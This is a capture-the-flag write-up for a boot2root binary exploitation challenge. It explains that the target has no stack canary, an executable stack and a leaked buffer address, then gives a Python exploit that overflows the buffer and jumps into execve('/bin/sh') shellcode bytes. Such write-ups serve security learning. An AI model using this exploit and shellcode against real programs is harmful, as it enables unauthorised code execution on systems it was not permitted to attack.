## shellCode (477pt) & Shellcode loooong (495pt)					

### Description

> I dont like long long shellcodes keep them short and crispy 
>
> nc 35.238.225.156 1008 
>
> Author: TheBadGuy


### Attachment

[shellcode](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/boot2root/pwn/shellcode/shellcode), [shellcode](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/boot2root/pwn/shellcode/short)

### Analysis

no canary, stack is executable and `buf` address is leaked, so we can jump to `shellcode` in the `buf`


### Solution

```python
ru('ed to[')
buf = int(ru(']'),16)

sc = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"

offset = 24
payload = 'A'*offset
payload += p64(buf+24+8)
payload += sc

sl(payload)
```

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/boot2root/pwn/shellcode) 


